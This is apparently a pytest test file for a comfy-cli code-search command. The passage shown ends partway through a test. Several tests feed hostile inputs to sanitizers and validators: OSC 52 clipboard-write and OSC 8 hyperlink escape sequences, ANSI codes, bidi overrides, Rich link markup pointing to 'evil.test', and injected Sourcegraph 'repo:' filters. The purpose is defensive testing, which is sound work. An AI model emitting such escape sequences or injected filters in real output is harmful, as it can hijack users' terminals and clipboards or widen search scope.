"""Tests for the code-search command."""

import ast
import io
import json
import sys
from unittest.mock import MagicMock, patch

import pytest
import requests
from rich.console import Console
from typer.testing import CliRunner

from comfy_cli._lazy import LazyCommand
from comfy_cli.command.code_search import (
    API_URL,
    DEFAULT_COUNT,
    MAX_CONTEXT_FILES,
    MAX_COUNT,
    MAX_QUERY_BYTES,
    MAX_RESPONSE_BYTES,
    REQUEST_TIMEOUT,
    TOTAL_REQUEST_DEADLINE,
    QueryRejectedError,
    ResponseTooLargeError,
    SearchUnavailableError,
    _attach_context,
    _build_query,
    _decode_search,
    _fetch_pinned_source,
    _fetch_results,
    _format_results,
    _get_stats,
    _print_results,
    _safe_markup_text,
    _source_slice,
    _strip_control_chars,
    _validate_query,
    _validate_source_identity,
    app,
    code_search_context,
    console,
)

runner = CliRunner()


def test_source_slice_preserves_pinned_range_and_class_body():
    source = (
        "header\nclass Example:\n    INPUT = 'NORMALIZED_AMPLITUDE'\n    def run(self):\n        return self.INPUT\n"
    )
    with patch("comfy_cli.command.code_search._fetch_pinned_source", return_value=source):
        snippet = _source_slice("owner/repo", "a" * 40, "nodes.py", 2, 5)
    assert snippet["repository"] == "owner/repo"
    assert snippet["commit"] == "a" * 40
    assert snippet["start_line"] == 2
    assert snippet["end_line"] == 5
    assert "NORMALIZED_AMPLITUDE" in snippet["text"]
    assert snippet["url"].endswith("#L2-L5")


def test_untrusted_content_note_covers_pinned_source_snippets():
    from comfy_cli.command.code_search import UNTRUSTED_CONTENT_NOTE

    assert "pinned source snippets" in UNTRUSTED_CONTENT_NOTE


def test_attach_context_makes_declaration_only_match_implementation_usable():
    results = [
        {
            "repository": "owner/repo",
            "commit": "b" * 40,
            "file": "nodes.py",
            "matches": [{"line": 2, "preview": "class Example:", "url": "match"}],
        }
    ]
    source = "header\nclass Example:\n    TYPE = 'NORMALIZED_AMPLITUDE'\n"
    with patch("comfy_cli.command.code_search._fetch_pinned_source", return_value=source):
        _attach_context(results)
    match = results[0]["matches"][0]
    assert match["preview"] == "class Example:"
    assert match["snippet"]["text"] != match["preview"]
    assert "NORMALIZED_AMPLITUDE" in match["snippet"]["text"]


def test_source_slice_returns_one_text_line_per_pinned_line():
    """The window must arrive as the lines it claims, not as one joined row.

    `_strip_control_chars` strips `\x0a` deliberately, for single-row service
    previews. Applied to a multi-line pinned window it deleted every
    separator: a 49-line KJNodes class came back as one 2 KiB line with no
    indentation, so the structure a Python reference is read for was gone even
    though the bytes were all present. Nothing here asserted line structure,
    which is how that shipped.
    """
    source = "".join(f"line{n}\n" for n in range(1, 11))
    with patch("comfy_cli.command.code_search._fetch_pinned_source", return_value=source):
        snippet = _source_slice("owner/repo", "a" * 40, "nodes.py", 3, 7)
    assert snippet["text"].split("\n") == ["line3", "line4", "line5", "line6", "line7"]
    assert snippet["line_count"] == 5
    assert snippet["line_count"] == snippet["end_line"] - snippet["start_line"] + 1


def test_source_slice_window_is_still_parseable_python():
    source = (
        "header\n"
        "class Example:\n"
        "    @classmethod\n"
        "    def INPUT_TYPES(s):\n"
        '        return {"required": {"amp": ("NORMALIZED_AMPLITUDE",)}}\n'
    )
    with patch("comfy_cli.command.code_search._fetch_pinned_source", return_value=source):
        snippet = _source_slice("owner/repo", "a" * 40, "nodes.py", 2, 5)
    # Indentation-significant source only survives transport if the newlines do.
    ast.parse(snippet["text"])


def test_source_slice_still_strips_escapes_inside_each_line():
    source = "safe\nbefore\x1b[2Jafter\x00\x9b\ntail\n"
    with patch("comfy_cli.command.code_search._fetch_pinned_source", return_value=source):
        snippet = _source_slice("owner/repo", "a" * 40, "nodes.py", 1, 3)
    # ESC and the C0/C1 bytes go, exactly as for a single-row preview; the
    # inert residue of a sequence is left alone, as it already was. What is
    # new is only that the three lines are still three lines.
    assert snippet["text"].split("\n") == ["safe", "before[2Jafter", "tail"]
    assert "\x1b" not in snippet["text"]
    assert "\x00" not in snippet["text"]
    assert "\x9b" not in snippet["text"]
    assert snippet["line_count"] == 3


def test_source_slice_does_not_promote_unicode_separator_to_new_line():
    source = "safe\ncomment\u2028code\ntail\n"
    with patch("comfy_cli.command.code_search._fetch_pinned_source", return_value=source):
        snippet = _source_slice("owner/repo", "a" * 40, "nodes.py", 1, 3)
    assert snippet["text"].split("\n") == ["safe", "commentcode", "tail"]
    assert snippet["line_count"] == 3


def test_source_slice_strips_bidi_and_other_format_controls():
    source = "safe\nleft\u202eright\nzero\u200bwidth\n"
    with patch("comfy_cli.command.code_search._fetch_pinned_source", return_value=source):
        snippet = _source_slice("owner/repo", "a" * 40, "nodes.py", 1, 3)
    assert snippet["text"].split("\n") == ["safe", "leftright", "zerowidth"]


def test_context_human_output_prints_source_as_literal_text():
    source = 'lines[i]\ndict[str, int]\nr"[/\\\\]"\n'
    output = io.StringIO()
    literal_console = Console(file=output, force_terminal=False, width=200)
    with (
        patch("comfy_cli.command.code_search._fetch_pinned_source", return_value=source),
        patch("comfy_cli.command.code_search.console", literal_console),
    ):
        code_search_context("owner/repo", "a" * 40, "nodes.py", 1, 3)
    rendered = output.getvalue()
    assert "lines[i]" in rendered
    assert "dict[str, int]" in rendered
    assert 'r"[/\\\\]"' in rendered


def test_attach_context_preserves_line_structure():
    results = [
        {
            "repository": "owner/repo",
            "commit": "b" * 40,
            "file": "nodes.py",
            "matches": [{"line": 2, "preview": "class Example:", "url": "match"}],
        }
    ]
    source = "header\nclass Example:\n    TYPE = 'NORMALIZED_AMPLITUDE'\n"
    with patch("comfy_cli.command.code_search._fetch_pinned_source", return_value=source):
        _attach_context(results)
    snippet = results[0]["matches"][0]["snippet"]
    assert snippet["text"].split("\n") == ["header", "class Example:", "    TYPE = 'NORMALIZED_AMPLITUDE'"]
    assert snippet["line_count"] == 3


def test_source_slice_rejects_unpinned_or_oversized_expansion():
    with pytest.raises(ValueError, match="40-character"):
        _source_slice("owner/repo", "main", "nodes.py", 1, 2)
    with pytest.raises(ValueError, match="at most 200"):
        _source_slice("owner/repo", "a" * 40, "nodes.py", 1, 201)


def test_source_slice_preserves_newlines_while_sanitizing_each_line():
    source = "first\x1b\n\tsecond\x00\nthird\n"
    with patch("comfy_cli.command.code_search._fetch_pinned_source", return_value=source):
        snippet = _source_slice("owner/repo", "a" * 40, "nodes.py", 1, 3)
    assert snippet["text"] == "first\n\tsecond\nthird"


def test_source_slice_only_counts_newline_as_a_line_separator():
    source = "first\u2028still first\nsecond\n"
    with patch("comfy_cli.command.code_search._fetch_pinned_source", return_value=source):
        snippet = _source_slice("owner/repo", "a" * 40, "nodes.py", 2, 2)
    assert snippet["start_line"] == 2
    assert snippet["text"] == "second"


class _StreamingResponse:
    def __init__(self, chunks, *, redirect=False):
        self.chunks = chunks
        self.is_redirect = redirect
        self.is_permanent_redirect = False
        self.closed = False

    def __enter__(self):
        return self

    def __exit__(self, *_args):
        self.closed = True

    def raise_for_status(self):
        return None

    def iter_content(self, chunk_size):
        assert chunk_size == 1024
        yield from self.chunks


def test_fetch_pinned_source_enforces_total_deadline_and_closes_response():
    response = _StreamingResponse([b"first", b"second"])
    with (
        patch("requests.get", return_value=response),
        patch("time.monotonic", side_effect=[0, TOTAL_REQUEST_DEADLINE + 1]),
        pytest.raises(requests.Timeout, match="total request deadline"),
    ):
        _fetch_pinned_source("owner/repo", "a" * 40, "nodes.py")
    assert response.closed


def test_fetch_pinned_source_closes_response_on_redirect_refusal():
    response = _StreamingResponse([], redirect=True)
    with patch("requests.get", return_value=response), pytest.raises(Exception, match="redirect"):
        _fetch_pinned_source("owner/repo", "a" * 40, "nodes.py")
    assert response.closed


@pytest.mark.parametrize("chunks", [[b"x" * (1024 * 1024 + 1)], [b"\xff"]])
def test_fetch_pinned_source_closes_response_on_early_error(chunks):
    response = _StreamingResponse(chunks)
    with patch("requests.get", return_value=response), pytest.raises(Exception):
        _fetch_pinned_source("owner/repo", "a" * 40, "nodes.py")
    assert response.closed


def test_fetch_pinned_source_only_sends_origin_header_for_agents():
    plain = _StreamingResponse([b"ok"])
    agent = _StreamingResponse([b"ok"])
    with patch("requests.get", side_effect=[plain, agent]) as get:
        _fetch_pinned_source("owner/repo", "a" * 40, "nodes.py")
        _fetch_pinned_source("owner/repo", "a" * 40, "nodes.py", agent_origin=True)
    assert "X-Comfy-Code-Search-Origin" not in get.call_args_list[0].kwargs["headers"]
    assert get.call_args_list[1].kwargs["headers"]["X-Comfy-Code-Search-Origin"] == "agent"


@pytest.mark.parametrize("repository", ["owner/.", "owner/..", "./repo", "../repo"])
def test_validate_source_identity_rejects_dot_only_segments(repository):
    with pytest.raises(ValueError, match="dots"):
        _validate_source_identity(repository, "a" * 40, "nodes.py")


def test_attach_context_caps_failed_fetch_attempts():
    results = [
        {
            "repository": "owner/repo",
            "commit": "b" * 40,
            "file": "nodes.py",
            "matches": [{"line": line, "preview": "missing", "url": "match"} for line in range(1, 8)],
        }
    ]
    with patch("comfy_cli.command.code_search._source_slice", side_effect=requests.Timeout) as source_slice:
        _attach_context(results)
    assert source_slice.call_count == MAX_CONTEXT_FILES
    assert "response cap" in results[0]["matches"][MAX_CONTEXT_FILES]["context_error"]


def test_attach_context_flags_stale_index_preview():
    results = [
        {
            "repository": "owner/repo",
            "commit": "b" * 40,
            "file": "nodes.py",
            "matches": [{"line": 2, "preview": "old content", "url": "match"}],
        }
    ]
    with patch("comfy_cli.command.code_search._fetch_pinned_source", return_value="header\nnew content\n"):
        _attach_context(results)
    match = results[0]["matches"][0]
    assert "does not match indexed preview" in match["context_error"]
    assert "snippet" not in match


def test_attach_context_flags_eof_truncated_window_without_aborting_search():
    results = [
        {
            "repository": "owner/repo",
            "commit": "b" * 40,
            "file": "nodes.py",
            "matches": [
                {"line": 500, "preview": "near eof", "url": "match-1"},
                {"line": 5, "preview": "later match", "url": "match-2"},
            ],
        }
    ]
    eof_snippet = {"url": "match-1", "text": "only one line", "start_line": 498}
    with patch(
        "comfy_cli.command.code_search._source_slice",
        side_effect=[eof_snippet, requests.Timeout],
    ):
        _attach_context(results)
    first, second = results[0]["matches"]
    assert "context unavailable" in first["context_error"]
    assert "snippet" not in first
    assert "context_error" in second


def test_context_console_prints_remote_source_as_literal_text():
    snippet = {
        "url": "https://example.test/source#L1-L1",
        "text": "data[i] list[int] unmatched [/] [link=https://evil.test]fake[/link]",
    }
    caller = MagicMock(agentic=False, source_env=None)
    with (
        patch("comfy_cli.command.code_search.detect_caller", return_value=caller),
        patch("comfy_cli.command.code_search._source_slice", return_value=snippet),
        console.capture() as capture,
    ):
        code_search_context.__wrapped__("owner/repo", "a" * 40, "nodes.py", 1, 1, False)
    output = capture.get()
    assert "data[i]" in output
    assert "list[int]" in output
    assert "[link=https://evil.test]fake[/link]" in output


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------

_REPO_INFO = {
    "name": "github.com/Comfy-Org/ComfyUI",
    "defaultBranch": {
        "name": "refs/heads/main",
        "displayName": "main",
        "target": {"commit": {"oid": "abc123def456", "abbreviatedOID": "abc123d"}},
    },
}


# A single well-formed FileMatch, for cases that care about whether matches
# survive a partial-failure response rather than about their contents.
_FILE_MATCH = {
    "__typename": "FileMatch",
    "repository": _REPO_INFO,
    "file": {"path": "nodes.py"},
    "lineMatches": [{"preview": "class LoadImage:", "lineNumber": 41, "offsetAndLengths": [[6, 9]]}],
}


@pytest.fixture
def search_response():
    """A realistic Sourcegraph search node."""
    return {
        "stats": {
            "approximateResultCount": "42",
            "languages": [{"name": "Python", "totalBytes": 1234, "totalLines": 100}],
        },
        "results": {
            "matchCount": 3,
            "limitHit": False,
            "approximateResultCount": "42",
            "elapsedMilliseconds": 50,
            "results": [
                {
                    "__typename": "FileMatch",
                    "repository": _REPO_INFO,
                    "file": {"path": "nodes.py"},
                    "lineMatches": [
                        {"preview": "class LoadImage:", "lineNumber": 41, "offsetAndLengths": [[6, 9]]},
                        {
                            "preview": "    def load_image(self, image):",
                            "lineNumber": 55,
                            "offsetAndLengths": [[8, 10]],
                        },
                    ],
                },
                {
                    "__typename": "FileMatch",
                    "repository": _REPO_INFO,
                    "file": {"path": "server.py"},
                    "lineMatches": [
                        {"preview": "from nodes import LoadImage", "lineNumber": 9, "offsetAndLengths": [[20, 9]]},
                    ],
                },
            ],
        },
    }


@pytest.fixture
def raw_api_response(search_response):
    """Full API response wrapping the search node."""
    return {"data": {"search": search_response}}


@pytest.fixture
def empty_search():
    """A search node with no results."""
    return {
        "stats": {"approximateResultCount": "0", "languages": []},
        "results": {
            "matchCount": 0,
            "limitHit": False,
            "approximateResultCount": "0",
            "elapsedMilliseconds": 10,
            "results": [],
        },
    }


@pytest.fixture
def empty_api_response(empty_search):
    return {"data": {"search": empty_search}}


@pytest.fixture
def limit_hit_search(search_response):
    search_response["results"]["limitHit"] = True
    return search_response


@pytest.fixture
def limit_hit_response(limit_hit_search):
    return {"data": {"search": limit_hit_search}}


# ---------------------------------------------------------------------------
# _build_query tests
# ---------------------------------------------------------------------------


class TestBuildQuery:
    def test_simple_query(self):
        assert _build_query("LoadImage", None, DEFAULT_COUNT) == f"type:file count:{DEFAULT_COUNT} (LoadImage)"

    def test_with_repo_short_name(self):
        result = _build_query("LoadImage", "ComfyUI", DEFAULT_COUNT)
        assert result == f"repo:^github\\.com/Comfy\\-Org/ComfyUI$ type:file count:{DEFAULT_COUNT} (LoadImage)"

    def test_with_repo_full_name(self):
        result = _build_query("LoadImage", "Comfy-Org/ComfyUI", DEFAULT_COUNT)
        assert result == f"repo:^github\\.com/Comfy\\-Org/ComfyUI$ type:file count:{DEFAULT_COUNT} (LoadImage)"

    def test_with_custom_count(self):
        result = _build_query("LoadImage", None, 50)
        assert result == "type:file count:50 (LoadImage)"

    def test_with_repo_and_count(self):
        result = _build_query("LoadImage", "ComfyUI", 100)
        assert result == "repo:^github\\.com/Comfy\\-Org/ComfyUI$ type:file count:100 (LoadImage)"

    def test_with_repo_already_host_qualified(self):
        """Sourcegraph reports repo names in `github.com/org/name` form (e.g.
        copy-pasted from search output) — must not double-prepend the host."""
        result = _build_query("LoadImage", "github.com/Comfy-Org/ComfyUI", DEFAULT_COUNT)
        assert result == f"repo:^github\\.com/Comfy\\-Org/ComfyUI$ type:file count:{DEFAULT_COUNT} (LoadImage)"
        assert "github.com/github" not in result

    def test_with_repo_full_url(self):
        result = _build_query("LoadImage", "https://github.com/Comfy-Org/ComfyUI", DEFAULT_COUNT)
        assert result == f"repo:^github\\.com/Comfy\\-Org/ComfyUI$ type:file count:{DEFAULT_COUNT} (LoadImage)"
        assert "github.com/github" not in result

    def test_rejects_injected_filters_and_repo_whitespace(self):
        for query in (
            "count:99 x",
            "repo:evil x",
            "timeout:2s x",
            "context:evil x",
            "rev:evil x",
            "revision:evil x",
            "fork:yes x",
            "archived:yes x",
            "select:repo x",
            "patterntype:regexp x",
        ):
            with pytest.raises(ValueError):
                _validate_query(query, None)
        with pytest.raises(ValueError):
            _validate_query("x", "ComfyUI count:99")

    def test_rejects_grouped_and_aliased_repo_filters(self):
        """Sourcegraph supports grouped expressions and a `r:` alias for `repo:`;
        both must be rejected at expression boundaries, not just after whitespace."""
        for query in (
            "foo OR (repo:github.com/other/project)",
            "foo OR(repo:evil)",
            "(repo:evil)",
            "((repo:evil))",
            "foo r:evil",
            "foo -repo:evil",
            "foo -r:evil",
            "foo NOT repo:evil",
            "foo OR (context:evil)",
            "foo OR (rev:evil)",
            "foo OR (revision:evil)",
            "foo OR (fork:yes)",
            "foo OR (archived:yes)",
            "foo OR (select:repo)",
            "foo OR (patterntype:regexp)",
            "foo -context:evil",
            "foo -rev:evil",
            "foo -fork:yes",
            "foo -archived:yes",
            "foo -select:repo",
            "foo -patterntype:regexp",
        ):
            with pytest.raises(ValueError):
                _validate_query(query, None)

    def test_does_not_reject_benign_lookalike_tokens(self):
        """Filter names that merely contain 'repo' as a substring must not be rejected."""
        for query in ("reporter:evil x", "myrepo:evil x", "repoman:evil x"):
            _validate_query(query, None)  # must not raise

    def test_does_not_reject_benign_code_tokens_matching_filter_names(self):
        """`r:` and `timeout:` must only reject real filter syntax (value glued
        to the colon), not ordinary code where the token happens to be followed
        by whitespace — a real Sourcegraph filter value is never separated
        from its colon by a space."""
        for query in (
            "def handler(r: Request)",
            "lambda r: r.id",
            "timeout: 30",
            "def foo(timeout: int = 30)",
        ):
            _validate_query(query, None)  # must not raise

    def test_still_rejects_real_r_and_timeout_filters(self):
        """Sanity check that tightening the regex didn't reopen the cases it
        was meant to close: a real filter value glued to the colon is rejected
        even though it now requires a non-space character after the colon."""
        for query in ("foo r:evil", "foo timeout:99s", "foo -r:evil", "(timeout:99s)"):
            with pytest.raises(ValueError):
                _validate_query(query, None)

    def test_rejects_query_over_byte_limit(self):
        with pytest.raises(ValueError):
            _validate_query("é" * (MAX_QUERY_BYTES // 2 + 1), None)

    def test_user_type_filter_preserved(self):
        """Don't inject type:file when the user already specified a type: filter."""
        result = _build_query("type:commit fix bug", None, DEFAULT_COUNT)
        assert "type:file" not in result
        assert result == f"count:{DEFAULT_COUNT} (type:commit fix bug)"

    def test_user_type_file_not_duplicated(self):
        result = _build_query("type:file LoadImage", None, DEFAULT_COUNT)
        assert result.count("type:file") == 1

    def test_ungrouped_or_does_not_escape_pinned_filters(self):
        """An ungrouped top-level OR must not let its second branch escape the
        pinned repo:/type:/count: filters — Sourcegraph's AND binds tighter
        than OR, so without wrapping the query in parens,
        `repo:^...$ type:file count:N foo OR file:x bar` would parse as
        `(repo:... type:file count:N foo) OR (file:x bar)`, leaving the
        second branch completely unscoped."""
        result = _build_query("foo OR file:x bar", "ComfyUI", DEFAULT_COUNT)
        assert result == (
            f"repo:^github\\.com/Comfy\\-Org/ComfyUI$ type:file count:{DEFAULT_COUNT} (foo OR file:x bar)"
        )
        # The pinned filters must sit outside a single parenthesized group
        # that wraps the whole user query, not be interleaved with it.
        assert result.endswith("(foo OR file:x bar)")


# ---------------------------------------------------------------------------
# _format_results tests
# ---------------------------------------------------------------------------


class TestFormatResults:
    def test_formats_valid_results(self, search_response):
        results = _format_results(search_response)
        assert len(results) == 2

        first = results[0]
        assert first["repository"] == "Comfy-Org/ComfyUI"
        assert first["file"] == "nodes.py"
        assert first["branch"] == "main"
        assert first["commit"] == "abc123def456"
        assert first["provenance"] == "default_branch_head"
        assert first["file_url"] == "https://github.com/Comfy-Org/ComfyUI/blob/abc123def456/nodes.py"
        assert len(first["matches"]) == 2

        match = first["matches"][0]
        assert match["line"] == 42  # lineNumber + 1
        assert match["preview"] == "class LoadImage:"
        assert match["url"] == f"{first['file_url']}#L42"

    def test_empty_results(self, empty_search):
        assert _format_results(empty_search) == []

    def test_skips_results_without_repo(self):
        search = {"results": {"results": [{"__typename": "FileMatch", "repository": None, "file": {"path": "x.py"}}]}}
        assert _format_results(search) == []

    def test_skips_results_without_file(self):
        search = {
            "results": {
                "results": [
                    {"__typename": "FileMatch", "repository": {"name": "github.com/Comfy-Org/ComfyUI"}, "file": None}
                ]
            }
        }
        assert _format_results(search) == []

    def test_handles_missing_branch_info(self):
        search = {
            "results": {
                "results": [
                    {
                        "__typename": "FileMatch",
                        "repository": {"name": "github.com/Comfy-Org/ComfyUI", "defaultBranch": None},
                        "file": {"path": "test.py"},
                        "lineMatches": [{"preview": "hello", "lineNumber": 0, "offsetAndLengths": []}],
                    }
                ]
            }
        }
        results = _format_results(search)
        assert len(results) == 1
        assert results[0]["branch"] == ""
        assert results[0]["commit"] == ""
        assert results[0]["file_url"] == ""
        assert results[0]["matches"][0]["url"] == ""

    def test_handles_completely_empty_response(self):
        assert _format_results({}) == []

    def test_handles_no_line_matches(self):
        search = {
            "results": {
                "results": [
                    {
                        "__typename": "FileMatch",
                        "repository": {"name": "github.com/Comfy-Org/ComfyUI", "defaultBranch": None},
                        "file": {"path": "test.py"},
                        "lineMatches": None,
                    }
                ]
            }
        }
        results = _format_results(search)
        assert len(results) == 1
        assert results[0]["matches"] == []

    # -----------------------------------------------------------------
    # Malformed-shape hardening (finding #6): anything beyond what
    # `_decode_search` already validated must raise SearchUnavailableError,
    # never crash with a raw traceback (AttributeError/TypeError/KeyError).
    # -----------------------------------------------------------------

    def test_null_results_results_is_unavailable(self):
        """`results.results` present but null must not silently become []
        via an unguarded `or []` that also swallows real malformed shapes —
        it must be distinguishable from a genuinely malformed non-list."""
        search = {"results": {"results": None}}
        assert _format_results(search) == []

    def test_non_list_results_results_raises(self):
        search = {"results": {"results": "not-a-list"}}
        with pytest.raises(SearchUnavailableError):
            _format_results(search)

    def test_non_dict_result_entry_raises(self):
        search = {"results": {"results": ["not-a-dict"]}}
        with pytest.raises(SearchUnavailableError):
            _format_results(search)

    def test_non_dict_repository_raises(self):
        search = {"results": {"results": [{"repository": "not-a-dict", "file": {"path": "x.py"}}]}}
        with pytest.raises(SearchUnavailableError):
            _format_results(search)

    def test_non_dict_file_raises(self):
        search = {
            "results": {"results": [{"repository": {"name": "github.com/Comfy-Org/ComfyUI"}, "file": "not-a-dict"}]}
        }
        with pytest.raises(SearchUnavailableError):
            _format_results(search)

    def test_non_list_line_matches_raises(self):
        search = {
            "results": {
                "results": [
                    {
                        "repository": {"name": "github.com/Comfy-Org/ComfyUI"},
                        "file": {"path": "x.py"},
                        "lineMatches": "not-a-list",
                    }
                ]
            }
        }
        with pytest.raises(SearchUnavailableError):
            _format_results(search)

    def test_non_dict_line_match_entry_raises(self):
        search = {
            "results": {
                "results": [
                    {
                        "repository": {"name": "github.com/Comfy-Org/ComfyUI"},
                        "file": {"path": "x.py"},
                        "lineMatches": ["not-a-dict"],
                    }
                ]
            }
        }
        with pytest.raises(SearchUnavailableError):
            _format_results(search)

    def test_non_string_file_path_raises(self):
        search = {
            "results": {"results": [{"repository": {"name": "github.com/Comfy-Org/ComfyUI"}, "file": {"path": 123}}]}
        }
        with pytest.raises(SearchUnavailableError):
            _format_results(search)

    def test_falsy_non_string_file_path_raises(self):
        """An empty list is falsy like a real empty string, but is not a str
        the way a bare `or ""` fallback would assume — it must be rejected
        rather than silently coerced to an empty path."""
        search = {
            "results": {"results": [{"repository": {"name": "github.com/Comfy-Org/ComfyUI"}, "file": {"path": []}}]}
        }
        with pytest.raises(SearchUnavailableError):
            _format_results(search)

    def test_non_int_line_number_raises(self):
        search = {
            "results": {
                "results": [
                    {
                        "repository": {"name": "github.com/Comfy-Org/ComfyUI"},
                        "file": {"path": "x.py"},
                        "lineMatches": [{"lineNumber": "not-a-number", "preview": "x"}],
                    }
                ]
            }
        }
        with pytest.raises(SearchUnavailableError):
            _format_results(search)

    def test_line_number_zero_is_preserved(self):
        """`lineNumber: 0` is a real zero-based match, not an absent value —
        it must become `line: 1`, not be silently replaced by the `or 0`
        fallback path's own default (which would produce the same `line: 1`
        here by coincidence, but must not do so via the wrong branch)."""
        search = {
            "results": {
                "results": [
                    {
                        "repository": {"name": "github.com/Comfy-Org/ComfyUI"},
                        "file": {"path": "x.py"},
                        "lineMatches": [{"lineNumber": 0, "preview": "x"}],
                    }
                ]
            }
        }
        results = _format_results(search)
        assert results[0]["matches"][0]["line"] == 1

    def test_false_line_number_raises(self):
        """`lineNumber: false` is falsy like a real 0, but is not an int the
        way a bare `or 0` fallback would assume — it must be rejected rather
        than silently coerced to a valid line number."""
        search = {
            "results": {
                "results": [
                    {
                        "repository": {"name": "github.com/Comfy-Org/ComfyUI"},
                        "file": {"path": "x.py"},
                        "lineMatches": [{"lineNumber": False, "preview": "x"}],
                    }
                ]
            }
        }
        with pytest.raises(SearchUnavailableError):
            _format_results(search)

    def test_empty_list_preview_raises(self):
        """An empty list is falsy like a real empty string, but is not a str
        the way a bare `or ""` fallback would assume — it must be rejected
        rather than silently coerced to an empty preview."""
        search = {
            "results": {
                "results": [
                    {
                        "repository": {"name": "github.com/Comfy-Org/ComfyUI"},
                        "file": {"path": "x.py"},
                        "lineMatches": [{"lineNumber": 1, "preview": []}],
                    }
                ]
            }
        }
        with pytest.raises(SearchUnavailableError):
            _format_results(search)

    def test_non_string_preview_raises(self):
        search = {
            "results": {
                "results": [
                    {
                        "repository": {"name": "github.com/Comfy-Org/ComfyUI"},
                        "file": {"path": "x.py"},
                        "lineMatches": [{"lineNumber": 1, "preview": ["not-a-string"]}],
                    }
                ]
            }
        }
        with pytest.raises(SearchUnavailableError):
            _format_results(search)

    def test_null_commit_does_not_crash(self):
        """`target.commit: null` (key present, value None) must not raise
        AttributeError — `.get("commit", {})` only falls back to `{}` when
        the key is *absent*, not when it is present-but-None."""
        search = {
            "results": {
                "results": [
                    {
                        "repository": {
                            "name": "github.com/Comfy-Org/ComfyUI",
                            "defaultBranch": {"displayName": "main", "target": {"commit": None}},
                        },
                        "file": {"path": "x.py"},
                    }
                ]
            }
        }
        results = _format_results(search)
        assert len(results) == 1
        assert results[0]["commit"] == ""
        assert results[0]["branch"] == "main"

    def test_null_display_name_does_not_leak_none_into_branch(self):
        """`defaultBranch.displayName: null` must not leak a None into the
        `branch` field (e.g. when later JSON-serialized or concatenated)."""
        search = {
            "results": {
                "results": [
                    {
                        "repository": {
                            "name": "github.com/Comfy-Org/ComfyUI",
                            "defaultBranch": {"displayName": None, "target": {"commit": {"oid": "abc123"}}},
                        },
                        "file": {"path": "x.py"},
                    }
                ]
            }
        }
        results = _format_results(search)
        assert len(results) == 1
        assert results[0]["branch"] == ""
        assert isinstance(results[0]["branch"], str)

    # -----------------------------------------------------------------
    # ANSI/control character stripping (finding #3): preview, repo, and
    # path come from public indexed third-party code the service does not
    # sanitize. Rich's own control-char stripping only covers BEL/BS/VT/FF/
    # CR, not ESC (0x1B) — which drives ANSI/OSC sequences.
    # -----------------------------------------------------------------

    def test_strips_osc52_clipboard_escape_from_preview(self):
        malicious_preview = "innocuous\x1b]52;c;ZXZpbCBjbGlwYm9hcmQ=\x07text"
        search = {
            "results": {
                "results": [
                    {
                        "repository": {"name": "github.com/Comfy-Org/ComfyUI"},
                        "file": {"path": "x.py"},
                        "lineMatches": [{"preview": malicious_preview, "lineNumber": 0}],
                    }
                ]
            }
        }
        results = _format_results(search)
        preview = results[0]["matches"][0]["preview"]
        # ESC and BEL (the bytes that make this an interpretable OSC 52
        # sequence rather than inert text) must be gone; the literal digits
        # and semicolons left behind are harmless plain text once stripped.
        assert "\x1b" not in preview
        assert "\x07" not in preview
        assert preview == "innocuous]52;c;ZXZpbCBjbGlwYm9hcmQ=text"

    def test_strips_ansi_escape_from_repo_name(self):
        malicious_repo = {"name": "github.com/evil\x1b[2Jorg/repo"}
        search = {"results": {"results": [{"repository": malicious_repo, "file": {"path": "x.py"}}]}}
        results = _format_results(search)
        assert "\x1b" not in results[0]["repository"]

    def test_strips_ansi_escape_from_file_path(self):
        malicious_path = "x\x1b]8;;http://evil\x07.py"
        search = {
            "results": {
                "results": [{"repository": {"name": "github.com/Comfy-Org/ComfyUI"}, "file": {"path": malicious_path}}]
            }
        }
        results = _format_results(search)
        assert "\x1b" not in results[0]["file"]

    def test_strips_ansi_escape_from_branch_name(self):
        search = {
            "results": {
                "results": [
                    {
                        "repository": {
                            "name": "github.com/Comfy-Org/ComfyUI",
                            "defaultBranch": {"displayName": "ma\x1b[31min"},
                        },
                        "file": {"path": "x.py"},
                    }
                ]
            }
        }
        results = _format_results(search)
        assert "\x1b" not in results[0]["branch"]


# ---------------------------------------------------------------------------
# _get_stats tests
# ---------------------------------------------------------------------------


class TestGetStats:
    def test_extracts_stats(self, search_response):
        stats = _get_stats(search_response)
        assert stats["approximate_count"] == "42"
        assert stats["match_count"] == 3
        assert stats["limit_hit"] is False

    def test_empty_response(self):
        stats = _get_stats({})
        assert stats["approximate_count"] == "0"
        assert stats["match_count"] == 0
        assert stats["limit_hit"] is False

    def test_limit_hit(self, limit_hit_search):
        stats = _get_stats(limit_hit_search)
        assert stats["limit_hit"] is True

    def test_null_stats_does_not_crash(self):
        """`stats: null` (key present, value None) must not raise
        AttributeError — `.get("stats", {})` only falls back to `{}` when
        the key is *absent*, not when it is present-but-None."""
        stats = _get_stats({"stats": None, "results": {"matchCount": 0, "limitHit": False}})
        assert stats["approximate_count"] == "0"

    def test_null_results_does_not_crash(self):
        stats = _get_stats({"stats": {"approximateResultCount": "5"}, "results": None})
        assert stats["approximate_count"] == "5"
        assert stats["match_count"] == 0
        assert stats["limit_hit"] is False

    def test_non_dict_stats_raises(self):
        with pytest.raises(SearchUnavailableError):
            _get_stats({"stats": "not-a-dict", "results": {}})

    def test_non_dict_results_raises(self):
        with pytest.raises(SearchUnavailableError):
            _get_stats({"stats": {}, "results": "not-a-dict"})


# ---------------------------------------------------------------------------
# _fetch_results tests
# ---------------------------------------------------------------------------


class TestFetchResults:
    @patch("requests.get")
    def test_successful_fetch(self, mock_get, raw_api_response):
        mock_response = MagicMock()
        mock_response.iter_content.return_value = [json.dumps(raw_api_response).encode()]
        mock_response.is_redirect = False
        mock_response.is_permanent_redirect = False
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        result = _fetch_results("LoadImage")

        mock_get.assert_called_once_with(
            API_URL,
            params={"query": "LoadImage"},
            timeout=REQUEST_TIMEOUT,
            allow_redirects=False,
            stream=True,
            headers={"Accept-Encoding": "identity"},
        )
        assert result == raw_api_response

    @patch("requests.get")
    def test_agent_origin_sends_advisory_service_header(self, mock_get, raw_api_response):
        mock_response = MagicMock()
        mock_response.iter_content.return_value = [json.dumps(raw_api_response).encode()]
        mock_response.is_redirect = False
        mock_response.is_permanent_redirect = False
        mock_response.raise_for_status.return_value = None
        mock_get.return_value = mock_response

        private_query = "unpublished_custom_node_secret"
        result = _fetch_results(private_query, agent_origin=True)

        mock_get.assert_called_once_with(
            API_URL,
            params={"query": private_query},
            timeout=REQUEST_TIMEOUT,
            allow_redirects=False,
            stream=True,
            headers={
